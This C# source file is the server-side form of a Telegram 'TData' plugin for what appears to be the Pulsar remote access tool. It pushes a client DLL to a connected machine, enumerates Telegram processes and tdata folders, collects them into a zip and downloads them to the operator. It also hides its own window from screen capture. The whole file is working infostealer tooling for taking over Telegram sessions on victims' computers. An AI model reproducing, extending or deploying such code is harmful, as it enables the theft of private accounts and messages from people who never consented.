using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;

namespace Pulsar.Server.Plugins.TelegramTData
{
    public partial class FrmTelegramTData : Form
    {
        private readonly Client _connectClient;
        private readonly TelegramTDataPlugin _plugin;
        private readonly FileManagerHandler _fileHandler;

        private static readonly Dictionary<Client, FrmTelegramTData> OpenedForms = new();

        private enum PluginState
        {
            Idle,
            LoadingPlugin,
            Ready
        }

        private PluginState _state = PluginState.Idle;
        private readonly List<TelegramProcessEntry> _processEntries = new List<TelegramProcessEntry>();

        private class TelegramProcessEntry
        {
            public int ProcessId { get; set; }
            public string TDataPath { get; set; }
        }

        public static FrmTelegramTData CreateNewOrGetExisting(Client client, TelegramTDataPlugin plugin)
        {
            if (OpenedForms.TryGetValue(client, out var existingForm))
            {
                existingForm.Focus();
                return existingForm;
            }

            var form = new FrmTelegramTData(client, plugin);
            form.Disposed += (s, e) => OpenedForms.Remove(client);
            OpenedForms.Add(client, form);
            return form;
        }

        public FrmTelegramTData(Client client, TelegramTDataPlugin plugin)
        {
            _connectClient = client ?? throw new ArgumentNullException(nameof(client));
            _plugin = plugin;

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            Pulsar.Server.Forms.ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            _fileHandler = new FileManagerHandler(_connectClient);
            _fileHandler.FileTransferUpdated += OnFileTransferUpdated;
            MessageHandler.Register(_fileHandler);

            _connectClient.ClientState += ClientDisconnected;

            this.Text = WindowHelper.GetWindowTitle("Telegram TData", _connectClient);
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            BeginLoadPlugin();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _connectClient.ClientState -= ClientDisconnected;
            _fileHandler.FileTransferUpdated -= OnFileTransferUpdated;
            MessageHandler.Unregister(_fileHandler);
            UniversalPluginResponseHandler.ResponseReceived -= OnClientResponse;
            _fileHandler?.Dispose();
            base.OnFormClosing(e);
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                SafeInvoke(Close);
        }

        private void SafeInvoke(Action action)
        {
            try
            {
                if (IsDisposed || !IsHandleCreated) return;
                if (InvokeRequired)
                    Invoke((MethodInvoker)(() => action()));
                else
                    action();
            }
            catch { }
        }

        #region Plugin lifecycle

        private void BeginLoadPlugin()
        {
            if (_plugin.GetClientDll() == null)
            {
                SetStatus("未找到客户端DLL");
                return;
            }

            _state = PluginState.LoadingPlugin;
            SetStatus("正在加载客户端插件...");

            PushSender.LoadUniversalPlugin(
                _connectClient,
                "TelegramTData.Client",
                _plugin.GetClientDll(),
                Array.Empty<byte>(),
                "Pulsar.Client.Plugins.TelegramTData.Client.TelegramTDataClientPlugin",
                "Initialize");

            UniversalPluginResponseHandler.ResponseReceived += OnClientResponse;
        }

        private void OnClientResponse(PluginResponse response)
        {
            if (response == null || response.PluginId != "TelegramTData.Client") return;
            if (response.Client != _connectClient) return;

            SafeInvoke(() =>
            {
                var message = response.Message ?? "";
                var command = response.Command ?? "";

                SetStatus($"来自 {command} 的响应：{message}");

                if (_state == PluginState.LoadingPlugin && command == "load")
                {
                    if (response.Success)
                    {
                        _state = PluginState.Ready;
                        SetStatus("插件已加载，正在扫描Telegram进程...");
                        RequestListProcesses();
                    }
                    else
                    {
                        _state = PluginState.Idle;
                        SetStatus($"插件加载失败：{message}");
                    }
                }
                else if (command == "ListTelegramProcesses")
                {
                    HandleListProcessesResponse(response);
                }
                else if (command == "CollectTData")
                {
                    HandleCollectTDataResponse(response);
                }
            });
        }

        private void RequestListProcesses()
        {
            SetStatus("正在扫描Telegram进程...");
            PushSender.ExecuteUniversalCommand(
                _connectClient, "TelegramTData.Client", "ListTelegramProcesses", Array.Empty<byte>());
        }

        private void HandleListProcessesResponse(PluginResponse response)
        {
            lvwProcesses.Items.Clear();
            _processEntries.Clear();

            if (!response.Success)
            {
                SetStatus($"获取进程列表失败：{response.Message}");
                return;
            }

            // Parse response: "pid|path1|pid|path2"  (each entry is "pid|path", entries joined by |)
            // Since Windows paths don't contain |, we can safely split and pair them
            var message = response.Message ?? "";
            var tokens = message.Split(new[] { '|' }, StringSplitOptions.RemoveEmptyEntries);

            if (tokens.Length < 2)
            {
                SetStatus("远程机器上未找到Telegram进程或tdata");
                return;
            }

            // Tokens alternate: pid, path, pid, path, ...
            for (int i = 0; i + 1 < tokens.Length; i += 2)
            {
                var pidStr = tokens[i];
                var tdataPath = tokens[i + 1];

                if (int.TryParse(pidStr, out var pid))
                {
                    _processEntries.Add(new TelegramProcessEntry
                    {
                        ProcessId = pid,
                        TDataPath = tdataPath
                    });

                    var item = new ListViewItem(pid.ToString());
                    item.SubItems.Add(tdataPath);
                    lvwProcesses.Items.Add(item);
                }
            }

            SetStatus($"找到 {_processEntries.Count} 个包含tdata的Telegram进程");
        }

        private string _pendingSavePath;

        private void HandleCollectTDataResponse(PluginResponse response)
        {
            if (response.Success && !string.IsNullOrEmpty(response.Message))
            {
                var remoteZipPath = response.Message;
                SetStatus("TData已收集，请选择保存位置...");

                SafeInvoke(() =>
                {
                    using (var sfd = new SaveFileDialog())
                    {
                        sfd.Title = "保存TData压缩包";
                        sfd.Filter = "ZIP文件 (*.zip)|*.zip|所有文件 (*.*)|*.*";
                        sfd.DefaultExt = "zip";
                        sfd.FileName = $"tdata_{_connectClient.Value?.PcName ?? "unknown"}_{DateTime.Now:yyyyMMdd_HHmmss}.zip";

                        if (sfd.ShowDialog() == DialogResult.OK)
                        {
                            _pendingSavePath = sfd.FileName;
                            BeginDownloadZip(remoteZipPath);
                        }
                        else
                        {
                            SetStatus("用户取消了下载");
                        }
                    }
                });
            }
            else
            {
                SetStatus($"收集TData失败：{response.Message}");
                MessageBox.Show(
                    $"收集TData失败：{response.Message}",
                    "Telegram TData",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
        }

        #endregion

        #region Download

        private void BeginDownloadZip(string remoteZipPath)
        {
            SetStatus($"正在下载：{Path.GetFileName(remoteZipPath)}...");
            // Download to default location; will move after completion
            _fileHandler.BeginDownloadFile(remoteZipPath, "", true);
        }

        private void OnFileTransferUpdated(object sender, FileTransfer transfer)
        {
            if (transfer == null) return;
            SafeInvoke(() =>
            {
                SetStatus($"传输 [{transfer.Id}]：{transfer.Status}");

                // Check if download completed
                if (transfer.Status != null &&
                    (transfer.Status.Equals("Completed", StringComparison.OrdinalIgnoreCase) ||
                     transfer.Status.Equals("Complete", StringComparison.OrdinalIgnoreCase) ||
                     transfer.Status.IndexOf("complete", StringComparison.OrdinalIgnoreCase) >= 0) &&
                    !string.IsNullOrEmpty(_pendingSavePath) && !string.IsNullOrEmpty(transfer.LocalPath))
                {
                    var defaultPath = transfer.LocalPath;
                    var savePath = _pendingSavePath;
                    _pendingSavePath = null;

                    try
                    {
                        // Ensure target directory exists
                        var saveDir = Path.GetDirectoryName(savePath);
                        if (!string.IsNullOrEmpty(saveDir) && !Directory.Exists(saveDir))
                            Directory.CreateDirectory(saveDir);

                        // Move file to user-chosen location
                        if (File.Exists(defaultPath))
                        {
                            if (defaultPath.Equals(savePath, StringComparison.OrdinalIgnoreCase))
                            {
                                SetStatus($"下载完成：{savePath}");
                            }
                            else
                            {
                                if (File.Exists(savePath)) File.Delete(savePath);
                                File.Move(defaultPath, savePath);
                                SetStatus($"下载完成：{savePath}");
                            }
                            MessageBox.Show(
                                $"TData下载成功！\n\n保存至：{savePath}",
                                "Telegram TData",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
                        }
                        else
                        {
                            SetStatus($"下载报告完成但未找到文件：{defaultPath}");
                        }
                    }
                    catch (Exception ex)
                    {
                        SetStatus($"保存文件出错：{ex.Message}");
                        // If move failed, the file is still at defaultPath
                        MessageBox.Show(
                            $"下载完成但未能移动到所选位置。\n\n" +
                            $"文件位于：{defaultPath}\n\n错误：{ex.Message}",
                            "Telegram TData",
                            MessageBoxButtons.OK,
                            MessageBoxIcon.Warning);
                    }
                }
            });
        }

        #endregion

        #region UI helpers

        private void SetStatus(string text)
        {
            SafeInvoke(() =>
            {
                lblStatus.Text = text;
            });
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            if (_state == PluginState.Ready)
                RequestListProcesses();
            else if (_state == PluginState.Idle)
                BeginLoadPlugin();
        }

        private void cmsProcess_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = lvwProcesses.SelectedItems.Count == 0;
        }

        private void tsmiDownload_Click(object sender, EventArgs e)
        {
            if (lvwProcesses.SelectedItems.Count == 0) return;

            if (_state != PluginState.Ready)
            {
                MessageBox.Show("插件尚未就绪。", "Telegram TData", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SetStatus("正在从远程机器收集TData...");
            PushSender.ExecuteUniversalCommand(
                _connectClient, "TelegramTData.Client", "CollectTData", Array.Empty<byte>());
        }

        private void tsmiDownloadAll_Click(object sender, EventArgs e)
        {
            // Same as single download since all tdata is from the same directory
            tsmiDownload_Click(sender, e);
        }

        #endregion

        private void lvwProcesses_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
